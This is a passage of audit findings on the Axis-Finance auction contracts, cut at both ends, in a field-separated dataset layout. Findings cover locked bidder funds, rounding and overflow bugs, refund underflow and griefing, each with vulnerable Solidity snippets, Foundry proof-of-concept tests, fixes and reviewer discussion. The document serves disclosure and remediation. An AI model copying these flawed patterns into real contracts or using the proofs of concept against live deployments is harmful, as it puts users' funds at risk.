`Settled`. This leaves the `bidders'` `quote` tokens locked in the `auction house`.\n```\nfunction test_cancel() external whenLotIsCreated {\n    Auction.Lot memory lot = _mockAuctionModule.getLot(_lotId);\n\n    console2.log(""lot.conclusion before   ==> "", lot.conclusion);\n    console2.log(""block.timestamp before  ==> "", block.timestamp);\n    console2.log(""isLive                  ==> "", _mockAuctionModule.isLive(_lotId));\n\n    vm.warp(lot.conclusion - block.timestamp + 1);\n    console2.log(""lot.conclusion after    ==> "", lot.conclusion);\n    console2.log(""block.timestamp after   ==> "", block.timestamp);\n    console2.log(""isLive                  ==> "", _mockAuctionModule.isLive(_lotId));\n\n    vm.prank(address(_auctionHouse));\n    _mockAuctionModule.cancelAuction(_lotId);\n}\n```\n\nThe log is\n```\nlot.conclusion before   ==>  86401\nblock.timestamp before  ==>  1\nisLive                  ==>  true\nlot.conclusion after    ==>  86401\nblock.timestamp after   ==>  86401\nisLive                  ==>  false\n```\n"ч```\nfunction _revertIfLotConcluded(uint96 lotId_) internal view virtual {\n-     if (lotData[lotId_].conclusion < uint48(block.timestamp)) {\n+     if (lotData[lotId_].conclusion <= uint48(block.timestamp)) {\n        revert Auction_MarketNotActive(lotId_);\n    }\n\n    // Capacity is sold-out, or cancelled\n    if (lotData[lotId_].capacity == 0) revert Auction_MarketNotActive(lotId_);\n}\n```\n\nDiscussion\nsherlock-admin4\nThe protocol team fixed this issue in the following PRs/commits: https://github.com/Axis-Fi/moonraker/pull/105\n10xhash\nThe protocol team fixed this issue in the following PRs/commits: Axis-Fi/moonraker#105\nFixed start and conclusion timestamps of auction is now made consistent across all functions\nsherlock-admin4\nThe Lead Senior Watson signed off on the fix.чUsers' funds can be locked.\nCode Snippet\nTool used\nManual Review
Bidders can not claim their bids if the auction creator claims the proceeds.чhighч```\nfunction _claimProceeds(uint96 lotId_)\n    internal\n    override\n    returns (uint96 purchased, uint96 sold, uint96 payoutSent)\n{\n    auctionData[lotId_].status = Auction.Status.Claimed;\n}\n```\nчBefore the `batch auction` begins, the `auction creator` should `prefund` `base` tokens to the `auction house`. During the `auction`, `bidders` transfer `quote` tokens to the `auction house`. After the `auction` settles,\n`Bidders` can claim their `bids` and either to receive `base` tokens or `retrieve` their `quote` tokens.\nThe `auction creator` can receive the `quote` tokens and `retrieve` the remaining `base` tokens.\nThere is no specific order for these two operations.\nHowever, if the `auction creator` claims the `proceeds`, `bidders` can not claim their `bids` anymore. Consequently, their `funds` will remain locked in the `auction house`.\nWhen the `auction creator` claims `Proceeds`, the `auction status` changes to `Claimed`.\n```\nfunction _claimProceeds(uint96 lotId_)\n    internal\n    override\n    returns (uint96 purchased, uint96 sold, uint96 payoutSent)\n{\n    auctionData[lotId_].status = Auction.Status.Claimed;\n}\n```\n\nOnce the `auction status` has transitioned to `Claimed`, there is indeed no way to change it back to `Settled`.\nHowever, `bidders` can only claim their `bids` when the `auction status` is `Settled`.\n```\nfunction claimBids(\n    uint96 lotId_,\n    uint64[] calldata bidIds_\n)\n    external\n    override\n    onlyInternal\n    returns (BidClaim[] memory bidClaims, bytes memory auctionOutput)\n{\n    _revertIfLotInvalid(lotId_);\n    _revertIfLotNotSettled(lotId_);   // @audit, here\n\n    return _claimBids(lotId_, bidIds_);\n}\n```\n\n```\nfunction test_claimProceeds_before_claimBids()\n    external\n    givenLotIsCreated\n    givenLotHasStarted\n    givenBidIsCreated(_BID_AMOUNT_UNSUCCESSFUL, _BID_AMOUNT_OUT_UNSUCCESSFUL)\n    givenBidIsCreated(_BID_PRICE_TWO_AMOUNT, _BID_PRICE_TWO_AMOUNT_OUT)\n    givenBidIsCreated(_BID_PRICE_TWO_AMOUNT, _BID_PRICE_TWO_AMOUNT_OUT)\n    givenBidIsCreated(_BID_PRICE_TWO_AMOUNT, _BID_PRICE_TWO_AMOUNT_OUT)\n    givenBidIsCreated(_BID_PRICE_TWO_AMOUNT, _BID_PRICE_TWO_AMOUNT_OUT)\n    givenBidIsCreated(_BID_PRICE_TWO_AMOUNT, _BID_PRICE_TWO_AMOUNT_OUT)\n    givenBidIsCreated(_BID_PRICE_TWO_AMOUNT, _BID_PRICE_TWO_AMOUNT_OUT)\n    givenLotHasConcluded\n    givenPrivateKeyIsSubmitted\n    givenLotIsDecrypted\n    givenLotIsSettled\n{\n    uint64 bidId = 1;\n\n    uint64[] memory bidIds = new uint64[](1);\n    bidIds[0] = bidId;\n\n    // Call the function\n    vm.prank(address(_auctionHouse));\n    _module.claimProceeds(_lotId);\n\n\n    bytes memory err = abi.encodeWithSelector(EncryptedMarginalPriceAuctionModule.Auction_WrongState.selector, _lotId);\n    vm.expectRevert(err);\n    vm.prank(address(_auctionHouse));\n    _module.claimBids(_lotId, bidIds);\n}\n```\nчAllow `bidders` to claim their `bids` even when the `auction status` is `Claimed`.\nDiscussion\nOighty\nDuplicate of #18\nsherlock-admin4\nThe protocol team fixed this issue in the following PRs/commits: https://github.com/Axis-Fi/moonraker/pull/139\n10xhash\nThe protocol team fixed this issue in the following PRs/commits: Axis-Fi/moonraker#139\nFixed The claimed status is replaced with a boolean. Hence the status of a settled auction will now always remain settled\nsherlock-admin4\nThe Lead Senior Watson signed off on the fix.чUsers' funds could be locked.\nCode Snippet\nTool used\nManual Review
Bidders' funds may become locked due to inconsistent price order checks in MaxPriorityQueue and the _claimBid function.чhighч```\nfunction _isLess(Queue storage self, uint256 i, uint256 j) private view returns (bool) {\n    uint64 iId = self.bidIdList[i];\n    uint64 jId = self.bidIdList[j];\n    Bid memory bidI = self.idToBidMap[iId];\n    Bid memory bidJ = self.idToBidMap[jId];\n    uint256 relI = uint256(bidI.amountIn) * uint256(bidJ.minAmountOut);\n    uint256 relJ = uint256(bidJ.amountIn) * uint256(bidI.minAmountOut);\n    if (relI == relJ) {\n        return iId > jId;\n    }\n    return relI < relJ;\n}\n```\nчIn the `MaxPriorityQueue`, `bids` are ordered by decreasing `price`. We calculate the marginal `price`, marginal `bid ID`, and determine the auction `winners`. When a `bidder` wants to claim, we verify that the bid `price` of this `bidder` exceeds the marginal `price`. However, there's minor inconsistency: certain `bids` may have marginal `price` and a smaller `bid ID` than marginal `bid ID` and they are not actually `winners`. As a result, the auction `winners` and these `bidders` can receive `base` tokens. However, there is a finite supply of `base` tokens for auction `winners`. Early `bidders` who claim can receive `base` tokens, but the last `bidders` can not.\nThe comparison for the order of `bids` in the `MaxPriorityQueue` is as follow: if `q1 * b2 < q2 * b1` then `bid (q2, b2)` takes precedence over `bid (q1, b1)`.\n```\nfunction _isLess(Queue storage self, uint256 i, uint256 j) private view returns (bool) {\n    uint64 iId = self.bidIdList[i];\n    uint64 jId = self.bidIdList[j];\n    Bid memory bidI = self.idToBidMap[iId];\n    Bid memory bidJ = self.idToBidMap[jId];\n    uint256 relI = uint256(bidI.amountIn) * uint256(bidJ.minAmountOut);\n    uint256 relJ = uint256(bidJ.amountIn) * uint256(bidI.minAmountOut);\n    if (relI == relJ) {\n        return iId > jId;\n    }\n    return relI < relJ;\n}\n```\n\nAnd in the `_calimBid` function, the `price` is checked directly as follow: if q * 10 ** baseDecimal / b >= marginal `price`, then this `bid` can be claimed.\n```\nfunction _claimBid(\n    uint96 lotId_,\n    uint64 bidId_\n) internal returns (BidClaim memory bidClaim, bytes memory auctionOutput_) {\n    uint96 price = uint96(\n        bidData.minAmountOut == 0\n            ? 0 // TODO technically minAmountOut == 0 should be an infinite price, but need to check that later. Need to be careful we don't introduce a way to claim a bid when we set marginalPrice to type(uint96).max when it cannot be settled.\n            : Math.mulDivUp(uint256(bidData.amount), baseScale, uint256(bidData.minAmountOut))\n    );\n    uint96 marginalPrice = auctionData[lotId_].marginalPrice;\n    if (\n        price > marginalPrice\n            || (price == marginalPrice && bidId_ <= auctionData[lotId_].marginalBidId)\n    ) { }\n}\n```\n\nThe issue is that a `bid` with the `marginal price` might being placed after `marginal bid` in the `MaxPriorityQueue` due to rounding.\n```\nq1 * b2 < q2 * b1, but mulDivUp(q1, 10 ** baseDecimal, b1) = mulDivUp(q2, 10 ** baseDecimal, b2)\n```\n\nLet me take an example. The `capacity` is `10e18` and there are `6` bids ((4e18 + 1, 2e18) for first `bidder`, `(4e18 + 2, 2e18)` for the other `bidders`. The order in the `MaxPriorityQueue` is `(2, 3, 4, 5, `6`, 1)`. The marginal `bid ID` is `6`. The `marginal price` is `2e18 + 1`. The `auction winners` are `(2, 3, 4, 5, 6)`. However, `bidder` 1 can also claim because it's `price` matches the `marginal price` and it has the smallest `bid ID`. There are only `10e18` `base` tokens, but all `6 bidders` require `2e18` `base` tokens. As a result, at least one `bidder` won't be able to claim `base` tokens, and his `quote` tokens will remain locked in the `auction house`.\nThe Log is\n```\nmarginal price     ==>   2000000000000000001\nmarginal bid id    ==>   6\n\npaid to bid  1       ==>   4000000000000000001\npayout to bid  1     ==>   1999999999999999999\n*****\npaid to bid  2       ==>   4000000000000000002\npayout to bid  2     ==>   2000000000000000000\n*****\npaid to bid  3       ==>   4000000000000000002\npayout to bid  3     ==>   2000000000000000000\n*****\npaid to bid  4       ==>   4000000000000000002\npayout to bid  4     ==>   2000000000000000000\n*****\npaid to bid  5       ==>   4000000000000000002\npayout to bid  5     ==>   2000000000000000000\n*****\npaid to bid  6       ==>   4000000000000000002\npayout to bid  6     ==>   2000000000000000000\n```\n\n```\nfunction test_claim_nonClaimable_bid()\n    external\n    givenLotIsCreated\n    givenLotHasStarted\n    givenBidIsCreated(4e18 + 1, 2e18)           // bidId = 1\n    givenBidIsCreated(4e18 + 2, 2e18)           // bidId = 2\n    givenBidIsCreated(4e18 + 2, 2e18)           // bidId = 3\n    givenBidIsCreated(4e18 + 2, 2e18)           // bidId = 4\n    givenBidIsCreated(4e18 + 2, 2e18)           // bidId = 5\n    givenBidIsCreated(4e18 + 2, 2e18)           // bidId = 6\n    givenLotHasConcluded\n    givenPrivateKeyIsSubmitted\n    givenLotIsDecrypted\n    givenLotIsSettled\n{\n    EncryptedMarginalPriceAuctionModule.AuctionData memory auctionData = _getAuctionData(_lotId);\n\n    console2.log('marginal price     ==>  ', auctionData.marginalPrice);\n    console2.log('marginal bid id    ==>  ', auctionData.marginalBidId);\n    console2.log('');\n\n    for (uint64 i; i < 6; i ++) {\n        uint64[] memory bidIds = new uint64[](1);\n        bidIds[0] = i + 1;\n        vm.prank(address(_auctionHouse));\n        (Auction.BidClaim[] memory bidClaims,) = _module.claimBids(_lotId, bidIds);\n        Auction.BidClaim memory bidClaim = bidClaims[0];\n        if (i > 0) {\n            console2.log('*****');\n        }\n        console2.log('paid to bid ', i + 1, '      ==>  ', bidClaim.paid);\n        console2.log('payout to bid ', i + 1, '    ==>  ', bidClaim.payout);\n    }\n}\n```\nчIn the `MaxPriorityQueue`, we should check the price: `Math.mulDivUp(q, 10 ** baseDecimal, b)`.\nDiscussion\nOighty\nBelieve this is valid due to bids below marginal price being able to claim, which would result in a winning bidder not receiving theirs. Need to think about the remediation a bit more. There are some other precision issues with the rounding up.\nsherlock-admin4\nThe protocol team fixed this issue in the following PRs/commits: https://github.com/Axis-Fi/moonraker/pull/146\n10xhash\nThe protocol team fixed this issue in the following PRs/commits: Axis-Fi/moonraker#146\nFixed Now same computation is used for queue and marginal price calculations\nsherlock-admin4\nThe Lead Senior Watson signed off on the fix.чCode Snippet\nTool used\nManual Review
Overflow in curate() function, results in permanently stuck fundsчhighч```\n    struct Routing {\n        // rest of code\n        uint96 funding; \n        // rest of code\n    }\n```\nч"The `Axis-Finance` protocol has a curate() function that can be used to set a certain fee to a curator set by the seller for a certain auction. Typically, a curator is providing some service to an auction seller to help the sale succeed. This could be doing diligence on the project and `vouching` for them, or something simpler, such as listing the auction on a popular interface. A lot of memecoins have a big supply in the trillions, for example SHIBA INU has a total supply of nearly 1000 trillion tokens and each token has 18 decimals. With a lot of new memecoins emerging every day due to the favorable bullish conditions and having supply in the trillions, it is safe to assume that such protocols will interact with the `Axis-Finance` protocol. Creating auctions for big amounts, and promising big fees to some celebrities or influencers to promote their project. The funding parameter in the Routing struct is of type `uint96`\n```\n    struct Routing {\n        // rest of code\n        uint96 funding; \n        // rest of code\n    }\n```\n\nThe max amount of tokens with 18 decimals a `uint96` variable can hold is around 80 billion. The problem arises in the curate() function, If the auction is prefunded, which all batch auctions are( a normal FPAM auction can also be prefunded), and the amount of prefunded tokens is big enough, close to 80 billion tokens with 18 decimals, and the curator fee is for example 7.5%, when the `curatorFeePayout` is added to the current funding, the funding will overflow.\n```\nunchecked {\n   routing.funding += curatorFeePayout;\n}\n```\n\n```\nfunction test_CuratorFeeOverflow() public {\n        vm.startPrank(alice);\n        Veecode veecode = fixedPriceAuctionModule.VEECODE();\n        Keycode keycode = keycodeFromVeecode(veecode);\n        bytes memory _derivativeParams = """";\n        uint96 lotCapacity = 75_000_000_000e18; // this is 75 billion tokens\n        mockBaseToken.mint(alice, 100_000_000_000e18);\n        mockBaseToken.approve(address(auctionHouse), type(uint256).max);\n\n        FixedPriceAuctionModule.FixedPriceParams  memory myStruct = FixedPriceAuctionModule.FixedPriceParams({\n            price: uint96(1e18),\n            maxPayoutPercent: uint24(1e5)\n        });\n\n        Auctioneer.RoutingParams memory routingA = Auctioneer.RoutingParams({\n            auctionType: keycode,\n            baseToken: mockBaseToken,\n            quoteToken: mockQuoteToken,\n            curator: curator,\n            callbacks: ICallback(address(0)),\n            callbackData: abi.encode(""""),\n            derivativeType: toKeycode(""""),\n            derivativeParams: _derivativeParams,\n            wrapDerivative: false,\n            prefunded: true\n        });\n\n        Auction.AuctionParams memory paramsA = Auction.AuctionParams({\n            start: 0,\n            duration: 1 days,\n            capacityInQuote: false,\n            capacity: lotCapacity,\n            implParams: abi.encode(myStruct)\n        });\n\n        string memory infoHashA;\n        auctionHouse.auction(routingA, paramsA, infoHashA);       \n        vm.stopPrank();\n\n        vm.startPrank(owner);\n        FeeManager.FeeType type_ = FeeManager.FeeType.MaxCurator;\n        uint48 fee = 7_500; // 7.5% max curator fee\n        auctionHouse.setFee(keycode, type_, fee);\n        vm.stopPrank();\n\n        vm.startPrank(curator);\n        uint96 fundingBeforeCuratorFee;\n        uint96 fundingAfterCuratorFee;\n        (,fundingBeforeCuratorFee,,,,,,,) = auctionHouse.lotRouting(0);\n        console2.log(""Here is the funding normalized before curator fee is set: "", fundingBeforeCuratorFee/1e18);\n        auctionHouse.setCuratorFee(keycode, fee);\n        bytes memory callbackData_ = """";\n        auctionHouse.curate(0, callbackData_);\n        (,fundingAfterCuratorFee,,,,,,,) = auctionHouse.lotRouting(0);\n        console2.log(""Here is the funding normalized after curator fee is set: "", fundingAfterCuratorFee/1e18);\n        console2.log(""Balance of base token of the auction house: "", mockBaseToken.balanceOf(address(auctionHouse))/1e18);\n        vm.stopPrank();\n    }\n```\n\n```\nLogs:\n  Here is the funding normalized before curator fee is set:  75000000000\n  Here is the funding normalized after curator fee is set:  1396837485\n  Balance of base token of the auction house:  80625000000\n```\n\nTo run the test use: `forge test -vvv --mt test_CuratorFeeOverflow`"чEither remove the unchecked block\n```\nunchecked {\n   routing.funding += curatorFeePayout;\n}\n```\n\nso that when overflow occurs, the transaction will revert, or better yet also change the funding variable type from `uint96` to `uint256` this way sellers can create big enough auctions, and provide sufficient curator fee in order to bootstrap their protocol successfully .\nDiscussion\nsherlock-admin4\nThe protocol team fixed this issue in the following PRs/commits: https://github.com/Axis-Fi/moonraker/pull/141\n10xhash\nThe protocol team fixed this issue in the following PRs/commits: Axis-Fi/moonraker#141\nFixed in https://github.com/Axis-Fi/moonraker/pull/130 by using uint256 hence avoiding unsafe casting. Confirmation tests added in PR 141\nsherlock-admin4\nThe Lead Senior Watson signed off on the fix.\nPseudoArtistHacks\nI think all the issues regarding overflow/underflow should be duped with each other The root cause of all the issues are same i.e unsafe castingчIf there is an overflow occurs in the curate() function, a big portion of the tokens will be stuck in the `Axis-Finance` protocol forever, as there is no way for them to be withdrawn, either by an admin function, or by canceling the auction (if an auction has started, only FPAM auctions can be canceled), as the amount returned is calculated in the following way\n```\n        if (routing.funding > 0) {\n            uint96 funding = routing.funding;\n\n            // Set to 0 before transfer to avoid re-entrancy\n            routing.funding = 0;\n\n            // Transfer the base tokens to the appropriate contract\n            Transfer.transfer(\n                routing.baseToken,\n                _getAddressGivenCallbackBaseTokenFlag(routing.callbacks, routing.seller),\n                funding,\n                false\n            );\n            // rest of code\n        }\n```\n\nCode Snippet\nTool used\nManual review & Foundry
Downcasting to uint96 can cause assets to be lost for some tokensчhighч```\n            settlement_.totalIn = uint96(result.totalAmountIn);\n```\nчDowncasting to uint96 can cause assets to be lost for some tokens\nAfter summing the individual bid amounts, the total bid amount is downcasted to uint96 without any checks\n```\n            settlement_.totalIn = uint96(result.totalAmountIn);\n```\n\nuint96 can be overflowed for multiple well traded tokens:\nEg:\nshiba inu : current price = $0.00003058 value of type(uint96).max tokens ~= 2^96 * 0.00003058 / 10^18 == 2.5 million $\nHence auctions that receive more than type(uint96).max amount of tokens will be downcasted leading to extreme loss for the auctionerч
Incorrect `prefundingRefund` calculation will disallow claimingчhighч```\n    function claimProceeds(\n        uint96 lotId_,\n        bytes calldata callbackData_\n    ) external override nonReentrant {\n        \n        // rest of code\n\n        (uint96 purchased_, uint96 sold_, uint96 payoutSent_) =\n            _getModuleForId(lotId_).claimProceeds(lotId_);\n\n        // rest of code.\n\n        // Refund any unused capacity and curator fees to the address dictated by the callbacks address\n        // By this stage, a partial payout (if applicable) and curator fees have been paid, leaving only the payout amount (`totalOut`) remaining.\n        uint96 prefundingRefund = routing.funding + payoutSent_ - sold_;\n        unchecked {\n            routing.funding -= prefundingRefund;\n        }\n```\nчIncorrect `prefundingRefund` calculation will lead to underflow and hence disallowing claiming\nThe `prefundingRefund` variable calculation inside the `claimProceeds` function is incorrect\n```\n    function claimProceeds(\n        uint96 lotId_,\n        bytes calldata callbackData_\n    ) external override nonReentrant {\n        \n        // rest of code\n\n        (uint96 purchased_, uint96 sold_, uint96 payoutSent_) =\n            _getModuleForId(lotId_).claimProceeds(lotId_);\n\n        // rest of code.\n\n        // Refund any unused capacity and curator fees to the address dictated by the callbacks address\n        // By this stage, a partial payout (if applicable) and curator fees have been paid, leaving only the payout amount (`totalOut`) remaining.\n        uint96 prefundingRefund = routing.funding + payoutSent_ - sold_;\n        unchecked {\n            routing.funding -= prefundingRefund;\n        }\n```\n\nHere `sold` is the total base quantity that has been `sold` to the bidders. Unlike required, the `routing.funding` variable need not be holding `capacity + (0,curator fees)` since it is decremented every time a payout of a bid is claimed\n```\n    function claimBids(uint96 lotId_, uint64[] calldata bidIds_) external override nonReentrant {\n        \n        // rest of code.\n\n            if (bidClaim.payout > 0) {\n \n                // rest of code\n\n                // Reduce funding by the payout amount\n                unchecked {\n                    routing.funding -= bidClaim.payout;\n                }\n```\n\nExample\nCapacity = 100 prefunded, hence routing.funding == 100 initially Sold = 90 and no partial fill/curation All bidders claim before the claimProceed function is invoked Hence routing.funding = 100 - 90 == 10 When claimProceeds is invoked, underflow and revert:\nuint96 prefundingRefund = routing.funding + payoutSent_ - sold_ == 10 + 0 - 90чChange the calculation to:\n```\nuint96 prefundingRefund = capacity - sold_ + curatorFeesAdjustment (how much was prefunded initially - how much will be sent out based on capacity - sold)\n```\n\nDiscussion\nsherlock-admin4\nThe protocol team fixed this issue in the following PRs/commits: https://github.com/Axis-Fi/moonraker/pull/140\n10xhash\nThe protocol team fixed this issue in the following PRs/commits: Axis-Fi/moonraker#140\nFixed Seller refund calculation is changed to `uint256 prefundingRefund = capacity_ - sold_ + maxCuratorPayout - curatorPayout`\nsherlock-admin4\nThe Lead Senior Watson signed off on the fix.чClaim proceeds function is broken. Sellers won't be able to receive the proceedings\nCode Snippet\nTool used\nManual Review
If pfBidder gets blacklisted the settlement process would be broken and every other bidders and the seller would lose their fundsчmediumч```\n            // Check if there was a partial fill and handle the payout + refund\n            if (settlement.pfBidder != address(0)) {\n                // Allocate quote and protocol fees for bid\n                _allocateQuoteFees(\n                    feeData.protocolFee,\n                    feeData.referrerFee,\n                    settlement.pfReferrer,\n                    routing.seller,\n                    routing.quoteToken,\n                    // Reconstruct bid amount from the settlement price and the amount out\n                    uint96(\n                        Math.mulDivDown(\n                            settlement.pfPayout, settlement.totalIn, settlement.totalOut\n                        )\n                    )\n                );\n\n                // Reduce funding by the payout amount\n                unchecked {\n                    routing.funding -= uint96(settlement.pfPayout);\n                }\n\n                // Send refund and payout to the bidder\n                //@audit if pfBidder gets blacklisted the settlement is broken\n                Transfer.transfer(\n                    routing.quoteToken, settlement.pfBidder, settlement.pfRefund, false\n                );\n\n                _sendPayout(settlement.pfBidder, settlement.pfPayout, routing, auctionOutput);\n            }\n```\nчDuring batch auction settlement, the bidder whos bid was partially filled gets the refund amount in quote tokens and his payout in base immediately. In case if quote or base is a token with blacklisted functionality (e.g. USDC) and bidder's account gets blacklisted after the bid was submitted, the settlement would be bricked and all bidders and the seller would lose their tokens/proceeds.\nIn the `AuctionHouse.settlement()` function there is a check if the bid was partially filled, in which case the function handles refund and payout immediately:\n```\n            // Check if there was a partial fill and handle the payout + refund\n            if (settlement.pfBidder != address(0)) {\n                // Allocate quote and protocol fees for bid\n                _allocateQuoteFees(\n                    feeData.protocolFee,\n                    feeData.referrerFee,\n                    settlement.pfReferrer,\n                    routing.seller,\n                    routing.quoteToken,\n                    // Reconstruct bid amount from the settlement price and the amount out\n                    uint96(\n                        Math.mulDivDown(\n                            settlement.pfPayout, settlement.totalIn, settlement.totalOut\n                        )\n                    )\n                );\n\n                // Reduce funding by the payout amount\n                unchecked {\n                    routing.funding -= uint96(settlement.pfPayout);\n                }\n\n                // Send refund and payout to the bidder\n                //@audit if pfBidder gets blacklisted the settlement is broken\n                Transfer.transfer(\n                    routing.quoteToken, settlement.pfBidder, settlement.pfRefund, false\n                );\n\n                _sendPayout(settlement.pfBidder, settlement.pfPayout, routing, auctionOutput);\n            }\n```\n\nIf `pfBidder` gets blacklisted after he submitted his bid, the call to `settle()` would revert. There is no way for other bidders to get a refund for the auction since settlement can only happen after auction conclusion but the `refundBid()` function needs to be called before the conclusion:\n```\n    function settle(uint96 lotId_)\n        external\n        virtual\n        override\n        onlyInternal\n        returns (Settlement memory settlement, bytes memory auctionOutput)\n    {\n        // Standard validation\n        _revertIfLotInvalid(lotId_);\n        _revertIfBeforeLotStart(lotId_);\n        _revertIfLotActive(lotId_); //@audit\n        _revertIfLotSettled(lotId_);\n        \n       // rest of code\n}\n```\n\n```\n    function refundBid(\n        uint96 lotId_,\n        uint64 bidId_,\n        address caller_\n    ) external override onlyInternal returns (uint96 refund) {\n        // Standard validation\n        _revertIfLotInvalid(lotId_);\n        _revertIfBeforeLotStart(lotId_);\n        _revertIfBidInvalid(lotId_, bidId_);\n        _revertIfNotBidOwner(lotId_, bidId_, caller_);\n        _revertIfBidClaimed(lotId_, bidId_);\n        _revertIfLotConcluded(lotId_); //@audit\n\n        // Call implementation-specific logic\n        return _refundBid(lotId_, bidId_, caller_);\n    }\n```\n\nAlso, the `claimBids` function would also revert since the lot wasn't settled and the seller wouldn't be able to get his prefunding back since he can neither `cancel()` the lot nor `claimProceeds()`.ч
Unsold tokens from a FPAM auction, will be stuck in the protocol, after the auction concludesчmediumч```\n    function _revertIfLotConcluded(uint96 lotId_) internal view virtual {\n        // Beyond the conclusion time\n        if (lotData[lotId_].conclusion < uint48(block.timestamp)) {\n            revert Auction_MarketNotActive(lotId_);\n        }\n\n        // Capacity is sold-out, or cancelled\n        if (lotData[lotId_].capacity == 0) revert Auction_MarketNotActive(lotId_);\n    }\n```\nч"The `Axis-Finance` protocol allows sellers to create two types of auctions: FPAM & EMPAM. An FPAM auction allows sellers to set a price, and a maxPayout, as well as create a prefunded auction. The seller of a FPAM auction can cancel it while it is still active by calling the cancel function which in turn calls the cancelAuction() function. If the auction is prefunded, and canceled while still active, all remaining funds will be transferred back to the seller. The problem arises if an FPAM prefunded auction is created, not all of the prefunded supply is bought by users, and the auction concludes. There is no way for the `baseTokens` still in the contract, to be withdrawn from the protocol, and they will be forever stuck in the `Axis-Finance` protocol. As can be seen from the below code snippet cancelAuction() function checks if an auction is concluded, and if it is the function reverts.\n```\n    function _revertIfLotConcluded(uint96 lotId_) internal view virtual {\n        // Beyond the conclusion time\n        if (lotData[lotId_].conclusion < uint48(block.timestamp)) {\n            revert Auction_MarketNotActive(lotId_);\n        }\n\n        // Capacity is sold-out, or cancelled\n        if (lotData[lotId_].capacity == 0) revert Auction_MarketNotActive(lotId_);\n    }\n```\n\n```\nfunction test_FundedPriceAuctionStuckFunds() public {\n        vm.startPrank(alice);\n        Veecode veecode = fixedPriceAuctionModule.VEECODE();\n        Keycode keycode = keycodeFromVeecode(veecode);\n        bytes memory _derivativeParams = """";\n        uint96 lotCapacity = 75_000_000_000e18; // this is 75 billion tokens\n        mockBaseToken.mint(alice, lotCapacity);\n        mockBaseToken.approve(address(auctionHouse), type(uint256).max);\n\n        FixedPriceAuctionModule.FixedPriceParams  memory myStruct = FixedPriceAuctionModule.FixedPriceParams({\n            price: uint96(1e18), \n            maxPayoutPercent: uint24(1e5)\n        });\n\n        Auctioneer.RoutingParams memory routingA = Auctioneer.RoutingParams({\n            auctionType: keycode,\n            baseToken: mockBaseToken,\n            quoteToken: mockQuoteToken,\n            curator: curator,\n            callbacks: ICallback(address(0)),\n            callbackData: abi.encode(""""),\n            derivativeType: toKeycode(""""),\n            derivativeParams: _derivativeParams,\n            wrapDerivative: false,\n            prefunded: true\n        });\n\n        Auction.AuctionParams memory paramsA = Auction.AuctionParams({\n            start: 0,\n            duration: 1 days,\n            capacityInQuote: false,\n            capacity: lotCapacity,\n            implParams: abi.encode(myStruct)\n        });\n\n        string memory infoHashA;\n        auctionHouse.auction(routingA, paramsA, infoHashA);       \n        vm.stopPrank();\n\n        vm.startPrank(bob);\n        uint96 fundingBeforePurchase;\n        uint96 fundingAfterPurchase;\n        (,fundingBeforePurchase,,,,,,,) = auctionHouse.lotRouting(0);\n        console2.log(""Here is the funding normalized before purchase: "", fundingBeforePurchase/1e18);\n        mockQuoteToken.mint(bob, 10_000_000_000e18);\n        mockQuoteToken.approve(address(auctionHouse), type(uint256).max);\n        Router.PurchaseParams memory purchaseParams = Router.PurchaseParams({\n            recipient: bob,\n            referrer: address(0),\n            lotId: 0,\n            amount: 10_000_000_000e18,\n            minAmountOut: 10_000_000_000e18,\n            auctionData: abi.encode(0),\n            permit2Data: """"\n        });\n        bytes memory callbackData = """";\n        auctionHouse.purchase(purchaseParams, callbackData);\n        (,fundingAfterPurchase,,,,,,,) = auctionHouse.lotRouting(0);\n        console2.log(""Here is the funding normalized after purchase: "", fundingAfterPurchase/1e18);\n        console2.log(""Balance of seler of quote tokens: "", mockQuoteToken.balanceOf(alice)/1e18);\n        console2.log(""Balance of bob in base token: "", mockBaseToken.balanceOf(bob)/1e18);\n        console2.log(""Balance of auction house in base token: "", mockBaseToken.balanceOf(address(auctionHouse)) /1e18);\n        skip(86401);\n        vm.stopPrank();\n\n        vm.startPrank(alice);\n        vm.expectRevert(\n            abi.encodeWithSelector(Auction.Auction_MarketNotActive.selector, 0)\n        );\n        auctionHouse.cancel(uint96(0), callbackData);\n        vm.stopPrank();\n    }\n```\n\n```\nLogs:\n  Here is the funding normalized before purchase:  75000000000\n  Here is the funding normalized after purchase:  65000000000\n  Balance of seler of quote tokens:  10000000000\n  Balance of bob in base token:  10000000000\n  Balance of auction house in base token:  65000000000\n```\n\nTo run the test use: `forge test -vvv --mt test_FundedPriceAuctionStuckFunds`"чImplement a function, that allows sellers to withdraw the amount left for a prefunded FPAM auction they have created, once the auction has concluded.\nDiscussion\nsherlock-admin4\nThe protocol team fixed this issue in the following PRs/commits: https://github.com/Axis-Fi/moonraker/pull/132\n10xhash\nThe protocol team fixed this issue in the following PRs/commits: Axis-Fi/moonraker#132\nFixed Now FPAM auctions are not prefunded\nsherlock-admin4\nThe Lead Senior Watson signed off on the fix.чIf a prefunded FPAM auction concludes and there are still tokens, not bought from the users, they will be stuck in the `Axis-Finance` protocol.\nCode Snippet\nTool used\nManual Review & Foundry
User's can be grieved by not submitting the private keyчmediumч```\n    function claimBids(\n        uint96 lotId_,\n        uint64[] calldata bidIds_\n    )\n        external\n        override\n        onlyInternal\n        returns (BidClaim[] memory bidClaims, bytes memory auctionOutput)\n    {\n        // Standard validation\n        _revertIfLotInvalid(lotId_);\n        _revertIfLotNotSettled(lotId_);\n```\nчUser's can be grieved by not submitting the private key\nBids cannot be refunded once the auction concludes. And bids cannot be claimed until the auction has been settled. Similarly a EMPAM auction cannot be cancelled once started.\n```\n    function claimBids(\n        uint96 lotId_,\n        uint64[] calldata bidIds_\n    )\n        external\n        override\n        onlyInternal\n        returns (BidClaim[] memory bidClaims, bytes memory auctionOutput)\n    {\n        // Standard validation\n        _revertIfLotInvalid(lotId_);\n        _revertIfLotNotSettled(lotId_);\n```\n\n```\n    function refundBid(\n        uint96 lotId_,\n        uint64 bidId_,\n        address caller_\n    ) external override onlyInternal returns (uint96 refund) {\n        // Standard validation\n        _revertIfLotInvalid(lotId_);\n        _revertIfBeforeLotStart(lotId_);\n        _revertIfBidInvalid(lotId_, bidId_);\n        _revertIfNotBidOwner(lotId_, bidId_, caller_);\n        _revertIfBidClaimed(lotId_, bidId_);\n        _revertIfLotConcluded(lotId_);\n```\n\n```\n    function _cancelAuction(uint96 lotId_) internal override {\n        // Validation\n        // Batch auctions cannot be cancelled once started, otherwise the seller could cancel the auction after bids have been submitted\n        _revertIfLotActive(lotId_);\n```\n\n```\n    function cancelAuction(uint96 lotId_) external override onlyInternal {\n        // Validation\n        _revertIfLotInvalid(lotId_);\n        _revertIfLotConcluded(lotId_);\n```\n\n```\n    function _settle(uint96 lotId_)\n        